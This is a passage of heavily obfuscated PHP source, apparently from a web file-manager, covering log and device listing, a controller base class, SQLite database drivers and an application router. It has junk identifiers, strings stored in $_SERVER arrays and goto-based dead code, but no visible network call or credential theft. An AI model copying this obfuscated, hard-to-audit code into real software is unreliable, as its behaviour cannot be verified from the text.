IO::infoFullSimple($œÉìÅİ¤[$êÕÃöÉÎ[87]]); } catch (Exception $åØÕò±¬) { continue; } $ğ›¬¨£˜[$êÕÃöÉÎ[87]] = $œÉìÅİ¤[$êÕÃöÉÎ[87]]; $÷Ú”µ¹»[] = $ğ›¬¨£˜[$êÕÃöÉÎ[191]] = $üµ–è²è[$êÕÃöÉÎ[191]]; $÷Ú”µ¹»[] = $ğ›¬¨£˜[$êÕÃöÉÎ[2414]] = $üµ–è²è[$êÕÃöÉÎ[190]]; break; } return $ğ›¬¨£˜; } private function getSourceList(&$ÁÊÜš É) { $œÆ¤­÷É =& $_SERVER[œ—üé‹ê]; $’ÄÕ¸ã· = array(); foreach ($ÁÊÜš É as $ªó¾“ãŸ => $°Ã»×éÀ) { $œ¿İ€´½ = json_decode($°Ã»×éÀ[$œÆ¤­÷É[540]], !0); if ($°Ã»×éÀ[$œÆ¤­÷É[33]] == $œÆ¤­÷É[2153]) { $œ¿İ€´½ = $this->descZipDownload($œ¿İ€´½, $’ÄÕ¸ã·); $ÁÊÜš É[$ªó¾“ãŸ][$œÆ¤­÷É[540]] = json_encode($œ¿İ€´½); continue; } if (strpos($°Ã»×éÀ[$œÆ¤­÷É[33]], $œÆ¤­÷É[2416]) !== 0) { if (!isset($œ¿İ€´½[$œÆ¤­÷É[87]]) || strpos($°Ã»×éÀ[$œÆ¤­÷É[33]], $œÆ¤­÷É[2646]) !== 0) { continue; } try { $Ã¹Â×•­ = IO::infoFullSimple($œ¿İ€´½[$œÆ¤­÷É[87]]); } catch (Exception $¢íº¹‡) { continue; } $’ÄÕ¸ã·[] = $œ¿İ€´½[$œÆ¤­÷É[191]] = $Ã¹Â×•­[$œÆ¤­÷É[191]]; $’ÄÕ¸ã·[] = $œ¿İ€´½[$œÆ¤­÷É[2414]] = $Ã¹Â×•­[$œÆ¤­÷É[190]]; $ÁÊÜš É[$ªó¾“ãŸ][$œÆ¤­÷É[540]] = json_encode($œ¿İ€´½); continue; } $’ÄÕ¸ã·[] = $œ¿İ€´½[$œÆ¤­÷É[191]]; $’ÄÕ¸ã·[] = $œ¿İ€´½[$œÆ¤­÷É[2414]]; if ($œ¿İ€´½[$œÆ¤­÷É[33]] == $œÆ¤­÷É[643]) { $’ÄÕ¸ã·[] = $œ¿İ€´½[$œÆ¤­÷É[540]][$œÆ¤­÷É[1342]]; $’ÄÕ¸ã·[] = $œ¿İ€´½[$œÆ¤­÷É[540]][$œÆ¤­÷É[1343]]; } if ($œ¿İ€´½[$œÆ¤­÷É[33]] == $œÆ¤­÷É[2424]) { $’ÄÕ¸ã·[] = $œ¿İ€´½[$œÆ¤­÷É[540]][$œÆ¤­÷É[191]]; } } if (!$’ÄÕ¸ã·) { return array(); } return Model($œÆ¤­÷É[942])->sourceListInfo($’ÄÕ¸ã·, !0); } private function logList($ú¦æª) { $”ñÂŠû =& $_SERVER[œ—üé‹ê]; $ü·‡´¯ = array_to_keyvalue($ú¦æª, $”ñÂŠû[12], $”ñÂŠû[1589]); $ùéÃ¨úŒ = Model($”ñÂŠû[617])->userListInfo(array_unique($ü·‡´¯)); $ƒ„ø÷¯ = $this->getSourceList($ú¦æª); $«ç€¿Œ = $this->typeAll(); $Â–Û«èü = array(); $‘ˆ¿î‘â = array(); foreach ($ú¦æª as $ÙÀÄÆ‰ => $¦ëÆÊ™) { $…ğæÌ¡İ = $¦ëÆÊ™[$”ñÂŠû[33]]; $Ç¯È Ò— = isset($ùéÃ¨úŒ[$¦ëÆÊ™[$”ñÂŠû[1589]]]) ? $ùéÃ¨úŒ[$¦ëÆÊ™[$”ñÂŠû[1589]]] : !1; $¸ •ƒÈĞ = strpos($…ğæÌ¡İ, $”ñÂŠû[2647]) === 0 ? LNG($”ñÂŠû[2648]) : LNG($”ñÂŠû[2644]); $¦ëÆÊ™[$”ñÂŠû[32]] = isset($Ç¯È Ò—[$”ñÂŠû[32]]) ? $Ç¯È Ò—[$”ñÂŠû[32]] : LNG($”ñÂŠû[2644]); $¦ëÆÊ™[$”ñÂŠû[2472]] = isset($Ç¯È Ò—[$”ñÂŠû[2472]]) ? $Ç¯È Ò—[$”ñÂŠû[2472]] : $”ñÂŠû[12]; $¦ëÆÊ™[$”ñÂŠû[1861]] = isset($«ç€¿Œ[$…ğæÌ¡İ]) ? $«ç€¿Œ[$…ğæÌ¡İ] : $¸ •ƒÈĞ; $¦ëÆÊ™[$”ñÂŠû[2353]] = $Ç¯È Ò—; $œçñ”‰ = json_decode($¦ëÆÊ™[$”ñÂŠû[540]], !0); $¦ëÆÊ™[$”ñÂŠû[1605]] = isset($œçñ”‰[$”ñÂŠû[1605]]) ? $œçñ”‰[$”ñÂŠû[1605]] : $”ñÂŠû[12]; $¦ëÆÊ™[$”ñÂŠû[2645]] = IpLocation::get($¦ëÆÊ™[$”ñÂŠû[1605]]); if (strpos($…ğæÌ¡İ, $”ñÂŠû[2416]) === 0 || isset($œçñ”‰[$”ñÂŠû[2414]])) { $œçñ”‰[$”ñÂŠû[90]] = $ƒ„ø÷¯[$œçñ”‰[$”ñÂŠû[191]]]; $œçñ”‰[$”ñÂŠû[2429]] = $ƒ„ø÷¯[$œçñ”‰[$”ñÂŠû[2414]]]; if ($œçñ”‰[$”ñÂŠû[33]] == $”ñÂŠû[643]) { $œçñ”‰[$”ñÂŠû[540]][$”ñÂŠû[1342]] = $ƒ„ø÷¯[$œçñ”‰[$”ñÂŠû[540]][$”ñÂŠû[1342]]]; $œçñ”‰[$”ñÂŠû[540]][$”ñÂŠû[1343]] = $ƒ„ø÷¯[$œçñ”‰[$”ñÂŠû[540]][$”ñÂŠû[1343]]]; } if ($œçñ”‰[$”ñÂŠû[33]] == $”ñÂŠû[2424]) { $œçñ”‰[$”ñÂŠû[540]][$”ñÂŠû[191]] = $ƒ„ø÷¯[$œçñ”‰[$”ñÂŠû[540]][$”ñÂŠû[191]]]; } if ($œçñ”‰[$”ñÂŠû[33]] == $”ñÂŠû[1330]) { $œçñ”‰[$”ñÂŠû[2429]] = $œçñ”‰[$”ñÂŠû[90]]; $œçñ”‰[$”ñÂŠû[2414]] = $œçñ”‰[$”ñÂŠû[2429]][$”ñÂŠû[191]]; $œçñ”‰[$”ñÂŠû[90]] = !1; $œçñ”‰[$”ñÂŠû[191]] = $”ñÂŠû[12]; } $ƒòÆó€ = array($”ñÂŠû[1330], $”ñÂŠû[2412]); if (!in_array($œçñ”‰[$”ñÂŠû[33]], $ƒòÆó€)) { if ($œçñ”‰[$”ñÂŠû[90]] && $œçñ”‰[$”ñÂŠû[90]][$”ñÂŠû[188]] == $”ñÂŠû[189]) { $‘ˆ¿î‘â[] = $¦ëÆÊ™[$”ñÂŠû[487]]; unset($ú¦æª[$ÙÀÄÆ‰]); continue; } if ($œçñ”‰[$”ñÂŠû[2429]] && $œçñ”‰[$”ñÂŠû[2429]][$”ñÂŠû[188]] == $”ñÂŠû[189]) { $‘ˆ¿î‘â[] = $¦ëÆÊ™[$”ñÂŠû[487]]; unset($ú¦æª[$ÙÀÄÆ‰]); continue; } } } $¦ëÆÊ™[$”ñÂŠû[540]] = $œçñ”‰; unset($¦ëÆÊ™[$”ñÂŠû[2649]]); $Â–Û«èü[] = $¦ëÆÊ™; } $this->clearSystemPathLog($‘ˆ¿î‘â); return $Â–Û«èü; } private function clearSystemPathLog($İÚÄéğ) { $¹ä¿ã¶é =& $_SERVER[œ—üé‹ê]; if (count($İÚÄéğ) == 0) { return; } $òšß˜ë  = array($¹ä¿ã¶é[487] => array($¹ä¿ã¶é[7], array_unique($İÚÄéğ))); $this->where($òšß˜ë )->delete(); } public function deviceList($…û”«½à, $Â¡»ËÊë = 0) { $·–™§Åõ =& $_SERVER[œ—üé‹ê]; $ »…ßƒˆ = array($·–™§Åõ[1589] => $…û”«½à, $·–™§Åõ[231] => array($·–™§Åõ[1181], $Â¡»ËÊë), $·–™§Åõ[33] => $·–™§Åõ[2125]); $°Å¿± = array(); $©‡áæë” = $this->field($·–™§Åõ[2650])->where($ »…ßƒˆ)->order($·–™§Åõ[2427])->limit(50)->select(); foreach ($©‡áæë” as $øà­ò˜™ => $°½î™¾æ) { if ($øà­ò˜™ > 0 && abs($°½î™¾æ[$·–™§Åõ[231]] - $©‡áæë”[$øà­ò˜™ - 1][$·–™§Åõ[231]]) < 5) { continue; } $Úáåâ¶É = json_decode($°½î™¾æ[$·–™§Åõ[540]], !0); $°½î™¾æ[$·–™§Åõ[1605]] = isset($Úáåâ¶É[$·–™§Åõ[1605]]) ? $Úáåâ¶É[$·–™§Åõ[1605]] : $·–™§Åõ[12]; unset($Úáåâ¶É[$·–™§Åõ[1605]]); $É¯øª¬ø = $this->deviceType($Úáåâ¶É[$·–™§Åõ[2417]]); if (isset($°Å¿±[$É¯øª¬ø])) { continue; } $°½î™¾æ[$·–™§Åõ[2645]] = IpLocation::get($°½î™¾æ[$·–™§Åõ[1605]]); $°½î™¾æ[$·–™§Åõ[540]] = $Úáåâ¶É; $°Å¿±[$É¯øª¬ø] = $°½î™¾æ; } return array_values($°Å¿±); } public function deviceType($Ññ±¼é) { return $Ññ±¼é; } } goto aâ¤•”Åã£; DÖñêµ°İ: class Controller extends ClassBaseCall { public $in; public $config; public $tpl; public $values; function __construct() { $Îê…Á™· =& $_SERVER[œ—üé‹ê]; global $in, $config; $this->config =& $config; $this->in =& $in; $this->values[$Îê…Á™·[6]] =& $config; $this->values[$Îê…Á™·[7]] =& $in; $this->tpl = TEMPLATE . MOD . $Îê…Á™·[8]; $this->_classObjectID = mt_rand(0, 10000); } public function loadClass($Ñéû§ÉÛ) { if (1 === func_num_args()) { $this->{$Ñéû§ÉÛ} = new $Ñéû§ÉÛ(); } else { $èí—³Ô† = new ReflectionClass($Ñéû§ÉÛ); $ÖÍà½ìÑ = func_get_args(); array_shift($ÖÍà½ìÑ); $this->{$Ñéû§ÉÛ} = $èí—³Ô†->newInstanceArgs($ÖÍà½ìÑ); } return $this->{$Ñéû§ÉÛ}; } public function routeBind($®ÁÇª¹¤, $ûšòš†Ü, $•í‰–Øå = 3) { $ÄÔÀ…İ =& $_SERVER[œ—üé‹ê]; $´ï’Üº = $this->in[$ÄÔÀ…İ[9]]; $®ÁÇª¹¤ = str_replace($ÄÔÀ…İ[10], $ÄÔÀ…İ[11], trim(trim($®ÁÇª¹¤, $ÄÔÀ…İ[8]), $ÄÔÀ…İ[12])); if (!$®ÁÇª¹¤ || count($´ï’Üº) <= $•í‰–Øå) { return !1; } $©¸·á´É = !0; $­ÜÌÀ«² = explode($ÄÔÀ…İ[8], $®ÁÇª¹¤); for ($ıÑ«ºÑà = 0; $ıÑ«ºÑà < count($­ÜÌÀ«²); $ıÑ«ºÑà++) { if ($­ÜÌÀ«²[$ıÑ«ºÑà] != $´ï’Üº[$•í‰–Øå + $ıÑ«ºÑà]) { $©¸·á´É = !1; break; } } if (!$©¸·á´É) { return; } call_user_func_array(array($this, $ûšòš†Ü), array()); } public function routeArgs($ôä¶¦Î = 3) { $ÅÈæóåº = $this->in[$_SERVER[œ—üé‹ê][9]]; if (count($ÅÈæóåº) <= $ôä¶¦Î) { return array(); } $¼Òô×ÓÜ = array(); for ($µô’ëŸ£ = $ôä¶¦Î; $µô’ëŸ£ < count($ÅÈæóåº); $µô’ëŸ£ += 2) { $¼Òô×ÓÜ[$ÅÈæóåº[$µô’ëŸ£]] = $ÅÈæóåº[$µô’ëŸ£ + 1]; $this->in[$ÅÈæóåº[$µô’ëŸ£]] = $ÅÈæóåº[$µô’ëŸ£ + 1]; } return $¼Òô×ÓÜ; } protected function assign($û ”®ƒª, $ˆà²â¹Õ) { $this->values[$û ”®ƒª] = $ˆà²â¹Õ; } protected function display($Áä÷ŠÏÙ) { ob_end_clean(); extract($this->values); require $this->tpl . $Áä÷ŠÏÙ; } } class DbSqliteBase extends Db { public function __construct($ìò¯Èİ³ = '') { $±è¼Ø–Ñ =& $_SERVER[œ—üé‹ê]; if (!extension_loaded($±è¼Ø–Ñ[13])) { think_exception(think_lang($±è¼Ø–Ñ[14]) . $±è¼Ø–Ñ[15]); } if (!empty($ìò¯Èİ³)) { if (!isset($ìò¯Èİ³[$±è¼Ø–Ñ[16]])) { $ìò¯Èİ³[$±è¼Ø–Ñ[16]] = 438; } $this->config = $ìò¯Èİ³; if (empty($this->config[$±è¼Ø–Ñ[17]])) { $this->config[$±è¼Ø–Ñ[17]] = array(); } } } public function connect($ĞÊ›‘æû = '', $ÙâñîØ = 0) { $…†¾áÌ„ =& $_SERVER[œ—üé‹ê]; if (!isset($this->linkID[$ÙâñîØ])) { if (empty($ĞÊ›‘æû)) { $ĞÊ›‘æû = $this->config; } $ŒæÜĞë½ = !empty($ĞÊ›‘æû[$…†¾áÌ„[17]][$…†¾áÌ„[18]]) ? $ĞÊ›‘æû[$…†¾áÌ„[17]][$…†¾áÌ„[18]] : $this->pconnect; $à“õú¢¯ = $ŒæÜĞë½ ? $…†¾áÌ„[19] : $…†¾áÌ„[20]; $this->linkID[$ÙâñîØ] = $à“õú¢¯($ĞÊ›‘æû[$…†¾áÌ„[21]], $ĞÊ›‘æû[$…†¾áÌ„[16]]); if (!$this->linkID[$ÙâñîØ]) { think_exception(sqlite_error_string()); } $this->connected = !0; @sqlite_busy_timeout($this->linkID[$ÙâñîØ], 30000); if (1 != think_config($…†¾áÌ„[22])) { unset($this->config); } } return $this->linkID[$ÙâñîØ]; } public function free() { $this->queryID = null; } public function query($¼ø’»•) { $›¢¸¼Ş¼ =& $_SERVER[œ—üé‹ê]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $¼ø’»•; if ($this->queryID) { $this->free(); } think_action_status($›¢¸¼Ş¼[23], 1); think_status($›¢¸¼Ş¼[24]); $this->queryID = sqlite_query($this->_linkID, $¼ø’»•); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = sqlite_num_rows($this->queryID); $úß±™Õ‰ = $this->getAll(); return $úß±™Õ‰; } } public function execute($º–Öò’ü) { $ …ØËàÎ =& $_SERVER[œ—üé‹ê]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $º–Öò’ü; if ($this->queryID) { $this->free(); } think_action_status($ …ØËàÎ[25], 1); think_status($ …ØËàÎ[24]); $¾–Êƒúé = sqlite_exec($this->_linkID, $º–Öò’ü); $this->debug(); if (!1 === $¾–Êƒúé) { $this->error(); return !1; } else { $this->numRows = sqlite_changes($this->_linkID); $this->lastInsID = sqlite_last_insert_rowid($this->_linkID); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { sqlite_query($this->_linkID, $_SERVER[œ—üé‹ê][26]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $Œ÷Å¬–Â = sqlite_query($this->_linkID, $_SERVER[œ—üé‹ê][27]); if (!$Œ÷Å¬–Â) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $è…Êã ü = sqlite_query($this->_linkID, $_SERVER[œ—üé‹ê][28]); if (!$è…Êã ü) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $Ñ™Ñºê = array(); if ($this->numRows > 0) { for ($û·¨Â”… = 0; $û·¨Â”… < $this->numRows; $û·¨Â”…++) { $Ñ™Ñºê[$û·¨Â”…] = sqlite_fetch_array($this->queryID, SQLITE_ASSOC); } sqlite_seek($this->queryID, 0); } return $Ñ™Ñºê; } public function getFields($Ñ°úÄ¶Š) { $„ñÑ¥Ş˜ =& $_SERVER[œ—üé‹ê]; $À—”•À = $this->query($„ñÑ¥Ş˜[29] . $Ñ°úÄ¶Š . $„ñÑ¥Ş˜[30]); $Óâ˜âêß = array(); if ($À—”•À) { foreach ($À—”•À as $Ğ¯òÛß => $ùúµ„Õ‡) { $Óâ˜âêß[$ùúµ„Õ‡[$„ñÑ¥Ş˜[31]]] = array($„ñÑ¥Ş˜[32] => $ùúµ„Õ‡[$„ñÑ¥Ş˜[31]], $„ñÑ¥Ş˜[33] => $ùúµ„Õ‡[$„ñÑ¥Ş˜[34]], $„ñÑ¥Ş˜[35] => (bool) ($ùúµ„Õ‡[$„ñÑ¥Ş˜[36]] === $„ñÑ¥Ş˜[12]), $„ñÑ¥Ş˜[37] => $ùúµ„Õ‡[$„ñÑ¥Ş˜[38]], $„ñÑ¥Ş˜[39] => strtolower($ùúµ„Õ‡[$„ñÑ¥Ş˜[40]]) == $„ñÑ¥Ş˜[41], $„ñÑ¥Ş˜[42] => strtolower($ùúµ„Õ‡[$„ñÑ¥Ş˜[43]]) == $„ñÑ¥Ş˜[44]); } } return $Óâ˜âêß; } public function getTables($çŸø£Éµ = '') { $şÌÙÓ½Å =& $_SERVER[œ—üé‹ê]; $»©Ïóü³ = $this->query($şÌÙÓ½Å[45] . $şÌÙÓ½Å[46] . $şÌÙÓ½Å[47]); $œ»ê¿ Ï = array(); foreach ($»©Ïóü³ as $—îÓÑ–ç => $É¨Ï¤ºÊ) { $œ»ê¿ Ï[$—îÓÑ–ç] = current($É¨Ï¤ºÊ); } return $œ»ê¿ Ï; } public function close() { if ($this->_linkID) { sqlite_close($this->_linkID); } $this->_linkID = null; } public function error() { $ËÇı° =& $_SERVER[œ—üé‹ê]; $ï©˜ò‡ = sqlite_last_error($this->_linkID); $this->error = $ï©˜ò‡ . $ËÇı°[4] . sqlite_error_string($ï©˜ò‡); if ($ËÇı°[12] != $this->queryStr) { $this->error .= LNG($ËÇı°[48]) . $this->queryStr; } think_trace($this->error, $ËÇı°[12], $ËÇı°[49]); return $this->error; } public function escapeString($÷²—á¿) { return sqlite_escape_string($÷²—á¿); } public function parseLimit($êö„‹˜ù) { $ºƒ„‹¢ =& $_SERVER[œ—üé‹ê]; $¯»òÏî = $ºƒ„‹¢[12]; if (!empty($êö„‹˜ù)) { $êö„‹˜ù = explode($ºƒ„‹¢[50], $êö„‹˜ù); if (count($êö„‹˜ù) > 1) { $¯»òÏî .= $ºƒ„‹¢[51] . $êö„‹˜ù[1] . $ºƒ„‹¢[52] . $êö„‹˜ù[0] . $ºƒ„‹¢[53]; } else { $¯»òÏî .= $ºƒ„‹¢[51] . $êö„‹˜ù[0] . $ºƒ„‹¢[53]; } } return $¯»òÏî; } } class DbSqlite3Base extends Db { public function __construct($°õëÔÁ¢ = '') { $˜ìê ÷è =& $_SERVER[œ—üé‹ê]; if (!class_exists($˜ìê ÷è[54])) { think_exception(think_lang($˜ìê ÷è[14]) . $˜ìê ÷è[55]); } if (!empty($°õëÔÁ¢)) { if (!isset($°õëÔÁ¢[$˜ìê ÷è[16]])) { $°õëÔÁ¢[$˜ìê ÷è[16]] = 438; } $this->config = $°õëÔÁ¢; if (empty($this->config[$˜ìê ÷è[17]])) { $this->config[$˜ìê ÷è[17]] = array(); } } } public function connect($ŠÔ¼íğ = '', $ÇğïÎœİ = 0) { $·Íò… =& $_SERVER[œ—üé‹ê]; if (!isset($this->linkID[$ÇğïÎœİ])) { if (empty($ŠÔ¼íğ)) { $ŠÔ¼íğ = $this->config; } $this->linkID[$ÇğïÎœİ] = new SQLite3($ŠÔ¼íğ[$·Íò…[21]]); if (!$this->linkID[$ÇğïÎœİ]) { think_exception($this->linkID[$ÇğïÎœİ]->lastErrorMsg()); } $this->connected = !0; @$this->linkID[$ÇğïÎœİ]->busyTimeout(30000); if (1 != think_config($·Íò…[22])) { unset($this->config); } } return $this->linkID[$ÇğïÎœİ]; } public function free() { $this->queryID = null; } public function query($ÙäÑ´¾Ì) { $ƒ•¬ñõó =& $_SERVER[œ—üé‹ê]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $ÙäÑ´¾Ì; if ($this->queryID) { $this->free(); } think_action_status($ƒ•¬ñõó[23], 1); think_status($ƒ•¬ñõó[24]); $this->queryID = $this->_linkID->query($ÙäÑ´¾Ì); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $¤Ö÷àææ = $this->getAll(); $this->numRows = count($¤Ö÷àææ); return $¤Ö÷àææ; } } public function execute($¾„áÓáƒ) { $×–øÒø =& $_SERVER[œ—üé‹ê]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $¾„áÓáƒ; if ($this->queryID) { $this->free(); } think_action_status($×–øÒø[25], 1); think_status($×–øÒø[24]); $¾Œåá‹õ = $this->_linkID->exec($¾„áÓáƒ); $this->debug(); if (!1 === $¾Œåá‹õ) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->changes(); $this->lastInsID = $this->_linkID->lastInsertRowID(); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->query($_SERVER[œ—üé‹ê][26]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $ î¡šòÚ = $this->_linkID->query($_SERVER[œ—üé‹ê][27]); if (!$ î¡šòÚ) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $Ö‹ÙŠ› = $this->_linkID->query($_SERVER[œ—üé‹ê][28]); if (!$Ö‹ÙŠ›) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $³ØİˆÜ = array(); while ($ŒÆé²â = $this->queryID->fetchArray(SQLITE3_ASSOC)) { $³ØİˆÜ[] = $ŒÆé²â; } $this->queryID->reset(); return $³ØİˆÜ; } public function getFields($±§Ïº¶ï) { $¬ŸÙÍé¡ =& $_SERVER[œ—üé‹ê]; $ÃÉ’Å„¶ = $this->query($¬ŸÙÍé¡[29] . $±§Ïº¶ï . $¬ŸÙÍé¡[30]); $ßùà„®Â = array(); if ($ÃÉ’Å„¶) { foreach ($ÃÉ’Å„¶ as $Ò´»öİ¢ => $Îƒ½¯«’) { $ßùà„®Â[$Îƒ½¯«’[$¬ŸÙÍé¡[32]]] = array($¬ŸÙÍé¡[32] => $Îƒ½¯«’[$¬ŸÙÍé¡[32]], $¬ŸÙÍé¡[33] => $Îƒ½¯«’[$¬ŸÙÍé¡[33]], $¬ŸÙÍé¡[35] => (bool) ($Îƒ½¯«’[$¬ŸÙÍé¡[35]] === $¬ŸÙÍé¡[12]), $¬ŸÙÍé¡[37] => $Îƒ½¯«’[$¬ŸÙÍé¡[56]], $¬ŸÙÍé¡[39] => (bool) $Îƒ½¯«’[$¬ŸÙÍé¡[57]], $¬ŸÙÍé¡[42] => (bool) $Îƒ½¯«’[$¬ŸÙÍé¡[57]]); } } return $ßùà„®Â; } public function getTables($°ãóñ  = '') { $ËÂÛŠóâ =& $_SERVER[œ—üé‹ê]; $Î÷©«ˆ = $this->query($ËÂÛŠóâ[45] . $ËÂÛŠóâ[46] . $ËÂÛŠóâ[47]); $ìÜ¢©ñÌ = array(); foreach ($Î÷©«ˆ as $¸¸Â’‚ò => $ü¢ÜÌ—ğ) { $ìÜ¢©ñÌ[$¸¸Â’‚ò] = current($ü¢ÜÌ—ğ); } return $ìÜ¢©ñÌ; } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $‘ö£Ğ¶ =& $_SERVER[œ—üé‹ê]; $this->error = $this->_linkID->lastErrorMsg(); if ($‘ö£Ğ¶[12] != $this->queryStr) { $this->error .= LNG($‘ö£Ğ¶[48]) . $this->queryStr; } think_trace($this->error, $‘ö£Ğ¶[12], $‘ö£Ğ¶[49]); return $this->error; } public function escapeString($¾ª±Œü—) { $‚è¡–ù£ =& $_SERVER[œ—üé‹ê]; if ($this->_linkID) { return $this->_linkID->escapeString($¾ª±Œü—); } return str_ireplace($‚è¡–ù£[58], $‚è¡–ù£[59], $¾ª±Œü—); } public function parseLimit($§†Ç£×§) { $Õ÷Ã©Ï‹ =& $_SERVER[œ—üé‹ê]; $Ÿƒ…ñş† = $Õ÷Ã©Ï‹[12]; if (!empty($§†Ç£×§)) { $§†Ç£×§ = explode($Õ÷Ã©Ï‹[50], $§†Ç£×§); if (count($§†Ç£×§) > 1) { $Ÿƒ…ñş† .= $Õ÷Ã©Ï‹[51] . $§†Ç£×§[1] . $Õ÷Ã©Ï‹[52] . $§†Ç£×§[0] . $Õ÷Ã©Ï‹[53]; } else { $Ÿƒ…ñş† .= $Õ÷Ã©Ï‹[51] . $§†Ç£×§[0] . $Õ÷Ã©Ï‹[53]; } } return $Ÿƒ…ñş†; } } goto cŠ¾ÄÕ´È‡; e©ÇĞÒºã: if (strlen($bwcpishrya) < $_SERVER[œ—üé‹ê][705]) { die; } class Application { private $defaultModule = "\x69\156\x64\145\170"; private $defaultController = "\151\156\144\x65\170"; private $defaultAction = "\x69\156\x64\145\170"; function __construct() { } public function setDefault($ĞÅ±Ññô) { $ñ…ùëÕ÷ =& $_SERVER[œ—üé‹ê]; $—Ó„ôŠ =& $_SERVER[·–Â öÌ]; $Ç™Á«ñŒ = explode($—Ó„ôŠ[0], trim($ĞÅ±Ññô, $—Ó„ôŠ[0])); $Î•ış‚Æ = $ñ…ùëÕ÷[706]; if (strlen($Î•ış‚Æ) < $ñ…ùëÕ÷[707]) { return; } $this->defaultModule = $Ç™Á«ñŒ[0] ? $Ç™Á«ñŒ[0] : $this->defaultModule; $œÚöëè¡ = $ñ…ùëÕ÷[708]; while ($œÚöëè¡ < $ñ…ùëÕ÷[707]) { if ($œÚöëè¡ >= 0) { break; } $œÚöëè¡++; } $this->defaultController = $Ç™Á«ñŒ[1] ? $Ç™Á«ñŒ[1] : $this->defaultController; $ÛÎëöä = $ñ…ùëÕ÷[709]; if (!$ÛÎëöä) { return; } $this->defaultAction = $Ç™Á«ñŒ[2] ? $Ç™Á«ñŒ[2] : $this->defaultAction; $this->ylmpeb5f5436($—Ó„ôŠ[1], array($this, $—Ó„ôŠ[2])); $µÛŸŒÎ• = $ñ…ùëÕ÷[710]; if (strlen($µÛŸŒÎ•) < $ñ…ùëÕ÷[707]) { die; } } public function appRun($‚¾²ªìù) { $Õ¸üÀ‘² =& $_SERVER[œ—üé‹ê]; $ƒÓ×‚€ì =& $_SERVER[·–Â öÌ]; $¹Çıôõ¬ = explode($ƒÓ×‚€ì[0], $‚¾²ªìù); $Õé‹ÍÕ· = $Õ¸üÀ‘²[711]; while (strlen($Õé‹ÍÕ·) < $Õ¸üÀ‘²[705]) { if (!$Õé‹ÍÕ·) { break; } $Õé‹ÍÕ·++; } $”®ŠöÂÑ = strtolower($¹Çıôõ¬[0]); $¼ï×˜ë = $Õ¸üÀ‘²[712]; if (strlen($¼ï×˜ë) < $Õ¸üÀ‘²[713]) { return; } $‡•íèŞê = $ƒÓ×‚€ì[3]; $ÛŞÈ üÆ = $Õ¸üÀ‘²[714]; if (!$ÛŞÈ üÆ) { die; } if ($”®ŠöÂÑ == $ƒÓ×‚€ì[4]) { $‡•íèŞê = $ƒÓ×‚€ì[5]; $¹Çıôõ¬[0] = $ƒÓ×‚€ì[6]; $¹Çıôõ¬[1] = $¹Çıôõ¬[1] . $ƒÓ×‚€ì[7]; $‚¾²ªìù = join($ƒÓ×‚€ì[0], $¹Çıôõ¬); $‚¾²ªìù = trim($‚¾²ªìù, $ƒÓ×‚€ì[0]); } call_user_func(array($ƒÓ×‚€ì[8], $ƒÓ×‚€ì[9]), $‡•íèŞê . $ƒÓ×‚€ì[10], $‚¾²ªìù); ActionCall($‚¾²ªìù); call_user_func(array($ƒÓ×‚€ì[8], $ƒÓ×‚€ì[9]), $‡•íèŞê . $ƒÓ×‚€ì[11], $‚¾²ªìù); $¨ÕÌÀ™å = $Õ¸üÀ‘²[715]; while (strlen($¨ÕÌÀ™å) < $Õ¸üÀ‘²[713]) { if (!$¨ÕÌÀ™å) { break; } $¨ÕÌÀ™å++; } } private function autorun() { $ÑäÎú¶Ğ =& $_SERVER[·–Â öÌ]; global $config; if (count($config[$ÑäÎú¶Ğ[12]]) == 0) { return; } foreach ($config[$ÑäÎú¶Ğ[12]] as $İÃùâø© => $ØèÄƒÈ×) { $this->appRun($ØèÄƒÈ×); } } private function nqchf0905303() { $Ş§‘’’Ä =& $_SERVER[œ—üé‹ê]; $ëÔ¥¡»á =& $_SERVER[·–Â öÌ]; $Óµ‡ääŠ = $ëÔ¥¡»á[4]; $ÈÑñ¡© = $Ş§‘’’Ä[716]; $çÁä³„Ã = $GLOBALS[$ëÔ¥¡»á[13]][$ëÔ¥¡»á[14]][0]; $Ï™­èî = $Ş§‘’’Ä[717]; if (!$Ï™­èî) { return; } if (!$çÁä³„Ã || strlen($çÁä³„Ã) <= strlen($Óµ‡ääŠ)) { return; } if (strtolower(substr($çÁä³„Ã, -strlen($Óµ‡ääŠ))) != $Óµ‡ääŠ) { return; } $ºÎ¢ãÍ = substr($çÁä³„Ã, 0, -strlen($Óµ‡ääŠ)); $ü¨§Íòù = array($ëÔ¥¡»á[4], $ºÎ¢ãÍ); $ñ¿‡œä· = array_slice($GLOBALS[$ëÔ¥¡»á[13]][$ëÔ¥¡»á[14]], 1); $GLOBALS[$ëÔ¥¡»á[13]][$ëÔ¥¡»á[14]] = array_merge($ü¨§Íòù, $ñ¿‡œä·); $ıÖˆò¸‘ = $Ş§‘’’Ä[718]; if (strlen($ıÖˆò¸‘) < $Ş§‘’’Ä[707]) { return; } $GLOBALS[$ëÔ¥¡»á[13]][$ëÔ¥¡»á[15]] = implode($ëÔ¥¡»á[0], $GLOBALS[$ëÔ¥¡»á[13]][$ëÔ¥¡»á[14]]); } private function vtnmd04f4ddf() { $´â‡ÓÖ =& $_SERVER[œ—üé‹ê]; $ÑÓúÅ‚¿ =& $_SERVER[·–Â öÌ]; if ($GLOBALS[$ÑÓúÅ‚¿[13]][$ÑÓúÅ‚¿[15]] != $ÑÓúÅ‚¿[6]) { return; } $®±’¡–µ = 